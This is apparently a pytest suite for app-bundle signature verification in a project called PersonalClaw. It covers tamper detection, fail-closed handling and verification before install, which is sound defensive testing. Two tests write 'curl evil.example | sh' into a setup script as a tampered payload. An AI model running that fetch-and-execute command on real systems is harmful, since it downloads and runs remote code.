"""SH-3 — app-bundle signature verification, at the Store's install chokepoint.

Four things are asserted here, in order of how badly getting them wrong would hurt:

1. **Verification runs BEFORE the bundle is used.** ``TestVerifyRunsBeforeInstall``
   instruments the real ``app_manager.install`` and asserts the verifier was called
   while the live app dir did not yet exist — a signature check that ran after an
   unpack is decoration.
2. **The signature covers the PAYLOAD, not just the manifest.** ``TestSwapTheUnsignedHalf``
   is the atom's load-bearing test: sign a bundle, then swap ``scripts/setup.sh`` (or add
   a file the digest manifest never listed, or delete one) and require a refusal. If only
   ``app.json`` were signed, the first case would install.
3. **Every failure fails closed.** ``TestFailsClosed`` walks missing halves, truncation,
   base64 garbage, an unknown key, the wrong key, a tampered trusted comment and a
   missing Ed25519 backend. None may return ``signed``.
4. **Unsigned is not a refusal.** ``TestUnsignedStaysInstallable`` pins C2's graduated
   trust: no signature → community tier → still installs.

**No private key material lives in this repository.** Every test here generates an
ephemeral Ed25519 keypair into ``tmp_path`` and points ``signing.trusted_keys_dir()`` at
it, so the shipped trust store (empty until owner task 2) is never a test dependency.
"""

from __future__ import annotations

import base64
import hashlib
import importlib.util
import json
import secrets
from pathlib import Path

import pytest

from personalclaw import signing
from personalclaw.apps import app_manager
from personalclaw.signing import (
    MANIFEST_FILENAME,
    SIGNATURE_FILENAME,
    SignatureState,
    build_digest_manifest,
    verify_bundle,
)
from personalclaw.supply_chain import TrustTier, Verdict

REPO_ROOT = Path(__file__).resolve().parents[2]

pytest.importorskip(
    "cryptography",
    reason="cryptography is a declared core dependency; a missing one is a broken env",
)


def _load_sign_app():
    """Import ``scripts/sign_app.py`` — the maintainer signer — so these tests exercise
    the SHIPPED signing implementation rather than a parallel one written for tests.
    A second, test-only signer would happily agree with a broken verifier."""
    spec = importlib.util.spec_from_file_location(
        "sh3_sign_app", REPO_ROOT / "scripts" / "sign_app.py"
    )
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


sign_app = _load_sign_app()


# ── fixtures ────────────────────────────────────────────────────────────────────


@pytest.fixture
def bundle(tmp_path: Path) -> Path:
    """A minimal, scan-clean app bundle."""
    root = tmp_path / "src" / "demo-app"
    (root / "scripts").mkdir(parents=True)
    (root / "app.json").write_text(
        json.dumps(
            {
                "name": "demo-app",
                "version": "1.0.0",
                "displayName": "Demo App",
                "description": "A bundle used to exercise signature verification.",
            }
        ),
        encoding="utf-8",
    )
    (root / "scripts" / "setup.sh").write_text("echo hello\n", encoding="utf-8")
    (root / "README.md").write_text("demo\n", encoding="utf-8")
    return root


@pytest.fixture
def keys(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """An EPHEMERAL keypair, generated at runtime, installed as the trust store.

    Returns the ``.seed`` path. The public half is copied into a tmp trust store and
    ``trusted_keys_dir`` is pointed at it, so the signer identity is the file stem
    (``PersonalClaw``) exactly as it would be in the packaged tree."""
    key_dir = tmp_path / "keys"
    store = tmp_path / "store"
    store.mkdir()
    pub, seed = sign_app.gen_key("PersonalClaw", key_dir)
    (store / pub.name).write_bytes(pub.read_bytes())
    monkeypatch.setattr(signing, "trusted_keys_dir", lambda: store)
    return seed


def _sign(bundle: Path, seed: Path) -> None:
    sign_app.sign_bundle(bundle, seed)


# ── the digest manifest ─────────────────────────────────────────────────────────


class TestDigestManifest:
    def test_covers_every_file_and_is_deterministic(self, bundle: Path) -> None:
        blob = build_digest_manifest(bundle)
        assert blob == build_digest_manifest(bundle), "manifest is not deterministic"
        lines = blob.decode().splitlines()
        assert lines[0] == signing.MANIFEST_HEADER
        covered = {ln.split("  ", 1)[1] for ln in lines[1:]}
        assert covered == {"app.json", "scripts/setup.sh", "README.md"}
        # the digests are real, not placeholders
        expected = hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
        assert f"{expected}  app.json" in lines

    def test_excludes_only_the_two_signature_files(self, bundle: Path, keys: Path) -> None:
        _sign(bundle, keys)
        covered = {
            ln.split("  ", 1)[1] for ln in build_digest_manifest(bundle).decode().splitlines()[1:]
        }
        assert MANIFEST_FILENAME not in covered and SIGNATURE_FILENAME not in covered
        assert covered == {"app.json", "scripts/setup.sh", "README.md"}

    def test_symlink_cannot_be_signed(self, bundle: Path) -> None:
        (bundle / "link.sh").symlink_to(bundle / "scripts" / "setup.sh")
        with pytest.raises(signing.ManifestError, match="symlink"):
            build_digest_manifest(bundle)


# ── round trip ──────────────────────────────────────────────────────────────────


class TestRoundTrip:
    def test_sign_then_verify(self, bundle: Path, keys: Path) -> None:
        assert verify_bundle(bundle).state is SignatureState.UNSIGNED
        _sign(bundle, keys)
        info = verify_bundle(bundle)
        assert info.state is SignatureState.SIGNED, info.reason
        assert info.signer == "PersonalClaw"
        assert info.reason == ""

    def test_signer_comes_from_the_trust_store_filename_not_the_bundle(
        self, bundle: Path, keys: Path
    ) -> None:
        """The bundle's own comment lines must not be able to choose the attribution."""
        _sign(bundle, keys)
        sig = bundle / SIGNATURE_FILENAME
        lines = sig.read_text(encoding="utf-8").splitlines()
        lines[0] = "untrusted comment: signature from TotallyTheVendor"
        sig.write_text("\n".join(lines) + "\n", encoding="utf-8")
        assert verify_bundle(bundle).signer == "PersonalClaw"

    def test_no_private_key_material_is_committed(self) -> None:
        """The trust store ships public halves only — the rule this atom must not break."""
        store = REPO_ROOT / "src" / "personalclaw" / "trusted_keys"
        assert store.is_dir()
        stray = [p.name for p in store.iterdir() if p.suffix not in (".pub", ".md")]
        assert not stray, f"non-public files in the trust store: {stray}"


# ── THE swap test ───────────────────────────────────────────────────────────────


class TestSwapTheUnsignedHalf:
    """Sign, then change something the naive design would leave unsigned.

    Each case must be REFUSED. The manifest-only variant is the one that matters: a
    signature over ``app.json`` alone verifies fine while ``scripts/setup.sh`` — the file
    that actually executes — is attacker-controlled."""

    def test_swapping_the_payload_after_signing_is_refused(self, bundle: Path, keys: Path) -> None:
        _sign(bundle, keys)
        assert verify_bundle(bundle).state is SignatureState.SIGNED
        (bundle / "scripts" / "setup.sh").write_text("curl evil.example | sh\n", encoding="utf-8")
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "scripts/setup.sh" in info.reason
        assert "modified after signing" in info.reason

    def test_swapping_the_manifest_after_signing_is_refused(self, bundle: Path, keys: Path) -> None:
        _sign(bundle, keys)
        manifest = json.loads((bundle / "app.json").read_text(encoding="utf-8"))
        manifest["displayName"] = "Definitely The Real App"
        (bundle / "app.json").write_text(json.dumps(manifest), encoding="utf-8")
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "app.json" in info.reason

    def test_adding_an_unlisted_file_is_refused(self, bundle: Path, keys: Path) -> None:
        """A digest LIST alone would miss this: every listed digest still matches."""
        _sign(bundle, keys)
        (bundle / "scripts" / "backdoor.sh").write_text("echo pwned\n", encoding="utf-8")
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "not covered by the signature" in info.reason
        assert "scripts/backdoor.sh" in info.reason

    def test_removing_a_signed_file_is_refused(self, bundle: Path, keys: Path) -> None:
        _sign(bundle, keys)
        (bundle / "README.md").unlink()
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "signed but missing" in info.reason
        assert "README.md" in info.reason

    def test_a_verifier_that_only_checked_the_manifest_would_pass_the_swap(
        self, bundle: Path, keys: Path
    ) -> None:
        """The meta-assertion: prove the swap test would go GREEN under the weak design,
        so nobody can later "simplify" verification down to app.json and stay green.

        The weak verifier is built here, in-process — the shipped one is untouched."""
        _sign(bundle, keys)
        signed_app_json = hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
        (bundle / "scripts" / "setup.sh").write_text("curl evil.example | sh\n", encoding="utf-8")

        weak_ok = signed_app_json == hashlib.sha256((bundle / "app.json").read_bytes()).hexdigest()
        assert weak_ok, "the manifest-only check should be fooled — that is the hole"
        assert (
            verify_bundle(bundle).state is SignatureState.INVALID
        ), "the shipped verifier accepted the swap the weak one accepts"


# ── fail-closed matrix ──────────────────────────────────────────────────────────


class TestFailsClosed:
    def test_manifest_without_signature(self, bundle: Path, keys: Path) -> None:
        _sign(bundle, keys)
        (bundle / SIGNATURE_FILENAME).unlink()
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert SIGNATURE_FILENAME in info.reason

    def test_signature_without_manifest(self, bundle: Path, keys: Path) -> None:
        """Deleting the manifest must not demote a signed bundle to the unsigned path."""
        _sign(bundle, keys)
        (bundle / MANIFEST_FILENAME).unlink()
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert info.state is not SignatureState.UNSIGNED

    @pytest.mark.parametrize(
        "mutate,expect",
        [
            (lambda t: "", "malformed"),
            (lambda t: "untrusted comment: x\n", "malformed"),
            (lambda t: t.replace(t.splitlines()[1], "!!!not base64!!!"), "malformed"),
            (lambda t: t.replace(t.splitlines()[1], t.splitlines()[1][:20]), "malformed"),
            (
                lambda t: "\n".join(
                    [t.splitlines()[0], t.splitlines()[1], "comment: nope", t.splitlines()[3]]
                ),
                "malformed",
            ),
        ],
        ids=["empty", "truncated-file", "bad-base64", "short-block", "no-trusted-comment"],
    )
    def test_malformed_signature_never_reads_as_valid(
        self, bundle: Path, keys: Path, mutate, expect: str
    ) -> None:
        _sign(bundle, keys)
        sig = bundle / SIGNATURE_FILENAME
        sig.write_text(mutate(sig.read_text(encoding="utf-8")), encoding="utf-8")
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert expect in info.reason

    def test_unknown_key_is_refused(self, bundle: Path, keys: Path, tmp_path: Path) -> None:
        """A valid signature from a key that is not in the in-tree store."""
        other = tmp_path / "other-keys"
        _, other_seed = sign_app.gen_key("Attacker", other)
        _sign(bundle, other_seed)
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "unknown signing key" in info.reason
        assert info.signer == ""

    def test_wrong_key_with_a_trusted_key_id_is_refused(
        self, bundle: Path, keys: Path, tmp_path: Path
    ) -> None:
        """The nastier shape: an attacker key that CLAIMS the trusted key's id. The id is
        just a lookup hint, so verification must still fail on the Ed25519 check."""
        trusted_id, _ = sign_app._read_seed(keys)
        attacker = tmp_path / "attacker"
        attacker.mkdir()
        seed = attacker / "Attacker.seed"
        seed.write_text(
            base64.b64encode(trusted_id + secrets.token_bytes(32)).decode() + "\n",
            encoding="utf-8",
        )
        _sign(bundle, seed)
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "does not verify" in info.reason

    def test_tampered_trusted_comment_is_refused(self, bundle: Path, keys: Path) -> None:
        _sign(bundle, keys)
        sig = bundle / SIGNATURE_FILENAME
        lines = sig.read_text(encoding="utf-8").splitlines()
        lines[2] = "trusted comment: file:something-else"
        sig.write_text("\n".join(lines) + "\n", encoding="utf-8")
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "trusted-comment" in info.reason

    def test_no_ed25519_backend_refuses_rather_than_accepts(
        self, bundle: Path, keys: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A signature we cannot check is not a signature we accept."""
        _sign(bundle, keys)
        monkeypatch.setattr(signing, "_ed25519_verifier", lambda: None)
        info = verify_bundle(bundle)
        assert info.state is SignatureState.INVALID
        assert "no Ed25519 backend" in info.reason

    def test_corrupt_key_file_does_not_disable_the_store(self, bundle: Path, keys: Path) -> None:
        """A garbage ``.pub`` sitting beside a good one must not shut verification off."""
        (signing.trusted_keys_dir() / "Broken.pub").write_text("untrusted comment: x\n%%%\n")
        _sign(bundle, keys)
        assert verify_bundle(bundle).state is SignatureState.SIGNED

    def test_empty_trust_store_refuses_every_signature(
        self, bundle: Path, keys: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The SHIPPED state until owner task 2 lands: no trusted keys → nothing verifies,
        and unsigned bundles are unaffected."""
        _sign(bundle, keys)
        empty = tmp_path / "empty-store"
        empty.mkdir()
        monkeypatch.setattr(signing, "trusted_keys_dir", lambda: empty)
        assert verify_bundle(bundle).state is SignatureState.INVALID
        for name in (MANIFEST_FILENAME, SIGNATURE_FILENAME):
            (bundle / name).unlink()
        assert verify_bundle(bundle).state is SignatureState.UNSIGNED


# ── the install chokepoint ──────────────────────────────────────────────────────


@pytest.fixture
def app_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    """Isolate the app tree — no test here may touch the real ``~/.personalclaw``."""
    import personalclaw.config.loader as loader
    from personalclaw.apps import manager

    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(loader, "config_dir", lambda: home)
    monkeypatch.setattr(manager, "config_dir", lambda: home)
    return home


@pytest.fixture
def trace(monkeypatch: pytest.MonkeyPatch) -> dict:
    """Record the ORDER of the install gate's steps and, for the signature check, whether
    the live app dir existed yet. This is how "verify before use" is proved rather than
    asserted: an ordering that flipped would show up here even if every refusal still
    worked, because a post-unpack check refuses only after the bytes are on disk."""
    seen: dict = {"order": [], "live_dir_existed_at_verify": None}
    real_verify = app_manager.verify_bundle
    real_scan = app_manager.default_scanner.scan

    def verify(root: Path, **kw):
        seen["order"].append("verify")
        seen["live_dir_existed_at_verify"] = app_manager.app_dir("demo-app").exists()
        return real_verify(root, **kw)

    def scan(root, tier):
        seen["order"].append("scan")
        return real_scan(root, tier)

    monkeypatch.setattr(app_manager, "verify_bundle", verify)
    monkeypatch.setattr(app_manager.default_scanner, "scan", scan)
    return seen


class TestVerifyRunsBeforeInstall:
    """The ordering property. A signature check that runs after an unpack, an import or a
    hook is decoration — these tests fail if verification moves after any of them."""

    def test_signature_is_verified_before_the_scan_and_before_the_commit(
        self, bundle: Path, keys: Path, app_home: Path, trace: dict
    ) -> None:
        _sign(bundle, keys)
        res = app_manager.install(bundle, origin="local")
        assert res.ok, res.error
        assert trace["order"][:2] == ["verify", "scan"], trace["order"]
        assert trace["live_dir_existed_at_verify"] is False
        assert res.scan is not None
        assert res.scan.signature.state is SignatureState.SIGNED
        assert res.scan.signature.signer == "PersonalClaw"

    def test_a_tampered_bundle_never_runs_its_install_hook(
        self, bundle: Path, keys: Path, app_home: Path, trace: dict
    ) -> None:
        """The sharpest form of "before use": the bundle's own code must never execute.

        ``setup.onInstall`` is RCE-by-design, so the marker file it writes is a direct
        witness that the payload ran. A refusal that happened after the hook would leave
        the marker behind even though the install "failed"."""
        marker = app_home / "hook-ran"
        manifest = json.loads((bundle / "app.json").read_text(encoding="utf-8"))
        manifest["setup"] = {"onInstall": f"touch {marker}"}
        (bundle / "app.json").write_text(json.dumps(manifest), encoding="utf-8")
        _sign(bundle, keys)
        # ...and now swap the payload the signature covered.
        (bundle / "scripts" / "setup.sh").write_text("echo swapped\n", encoding="utf-8")

        res = app_manager.install(bundle, origin="local", confirm=True)
        assert res.ok is False
        assert "invalid signature" in (res.error or "")
        assert not marker.exists(), "the install hook ran on a bundle with a bad signature"
        assert not app_manager.app_dir("demo-app").exists()
        assert trace["order"] == ["verify"], "the scan ran after a terminal signature refusal"

    def test_confirm_does_not_override_an_invalid_signature(
        self, bundle: Path, keys: Path, app_home: Path
    ) -> None:
        """Consent covers *risk*, not *tampering*: there is nothing for a user to weigh."""
        _sign(bundle, keys)
        (bundle / "README.md").write_text("swapped\n", encoding="utf-8")
        for confirm in (False, True):
            res = app_manager.install(bundle, origin="local", confirm=confirm)
            assert res.ok is False
            assert res.needs_consent is False, "a tampered bundle was offered as consentable"
            assert res.scan is not None
            assert res.scan.signature.state is SignatureState.INVALID
            assert res.scan.signature.reason

    def test_update_re_verifies_and_leaves_the_old_app_intact(
        self, bundle: Path, keys: Path, app_home: Path
    ) -> None:
        """An update is a fresh fetch of mutable content, so it re-passes the whole gate —
        otherwise "update" is the way around signing."""
        _sign(bundle, keys)
        assert app_manager.install(bundle, origin="local").ok

        (bundle / "scripts" / "setup.sh").write_text("echo tampered\n", encoding="utf-8")
        res = app_manager.update(bundle, name="demo-app", origin="local", confirm=True)
        assert res.ok is False
        assert "invalid signature" in (res.error or "")
        live = app_manager.app_dir("demo-app") / "scripts" / "setup.sh"
        assert live.read_text(encoding="utf-8") == "echo hello\n", "the tampered update landed"

    def test_the_installed_bytes_are_the_signed_bytes(
        self, bundle: Path, keys: Path, app_home: Path
    ) -> None:
        """The sibling invariant to SH-5's scanned==installed: signed==installed. The live
        tree's digest manifest must reproduce the one that was signed."""
        _sign(bundle, keys)
        signed_manifest = (bundle / MANIFEST_FILENAME).read_bytes()
        assert app_manager.install(bundle, origin="local").ok
        live = app_manager.app_dir("demo-app")
        installed = {
            rel: hashlib.sha256((live / rel).read_bytes()).hexdigest()
            for rel in ("app.json", "scripts/setup.sh", "README.md")
        }
        for line in signed_manifest.decode().splitlines()[1:]:
            digest, _, rel = line.partition("  ")
            assert installed[rel] == digest, f"{rel} differs from the bytes that were signed"


class TestUnsignedStaysInstallable:
    """C2's graduated trust: unsigned is a *state*, not a verdict. Never a hard wall."""

    def test_unsigned_installs_at_community_tier(
        self, bundle: Path, keys: Path, app_home: Path
    ) -> None:
        res = app_manager.install(bundle, origin="local")
        assert res.ok, res.error
        assert res.scan is not None
        assert res.scan.signature.state is SignatureState.UNSIGNED
        assert res.scan.tier is TrustTier.COMMUNITY
        assert res.scan.verdict in (Verdict.CLEAN, Verdict.LOW)

    def test_a_valid_signature_raises_a_community_origin_to_official(
        self, bundle: Path, keys: Path, app_home: Path
    ) -> None:
        """The whole point of signing: proven provenance buys the tier the curated
        registry already has. It never LOWERS a tier a bundle already earned."""
        _sign(bundle, keys)
        res = app_manager.install(bundle, origin="local")
        assert res.ok, res.error
        assert res.scan is not None
        assert res.scan.tier is TrustTier.OFFICIAL

        info, tier = app_manager._signature_gate(bundle, "builtin")
        assert info.state is SignatureState.SIGNED
        assert tier is TrustTier.BUILTIN, "signing downgraded a builtin app's tier"

    def test_an_unsigned_bundle_keeps_its_origins_tier(self, bundle: Path, keys: Path) -> None:
        for origin, expected in (
            ("local", TrustTier.COMMUNITY),
            ("registry", TrustTier.OFFICIAL),
            ("builtin", TrustTier.BUILTIN),
        ):
            info, tier = app_manager._signature_gate(bundle, origin)
            assert info.state is SignatureState.UNSIGNED
            assert tier is expected


class TestConsentPayload:
    """C2's wire shape — what the consent UI reads."""

    def test_scan_report_serializes_state_signer_and_reason(self, bundle: Path, keys: Path) -> None:
        from personalclaw.supply_chain import ScanReport

        _sign(bundle, keys)
        report = ScanReport(signature=verify_bundle(bundle))
        payload = report.to_dict()["signature"]
        assert payload == {"state": "signed", "signer": "PersonalClaw", "reason": ""}

        (bundle / "app.json").write_text("{}", encoding="utf-8")
        bad = ScanReport(signature=verify_bundle(bundle)).to_dict()["signature"]
        assert bad["state"] == "invalid"
        assert bad["reason"], "an invalid signature must carry the reason the UI shows"

    def test_a_report_that_never_looked_says_unsigned_not_signed(self) -> None:
        """The default must be the honest one — a path that never verified must not be
        able to render "signed by PersonalClaw"."""
        from personalclaw.supply_chain import ScanReport

        assert ScanReport().to_dict()["signature"] == {
            "state": "unsigned",
            "signer": "",
            "reason": "",
        }
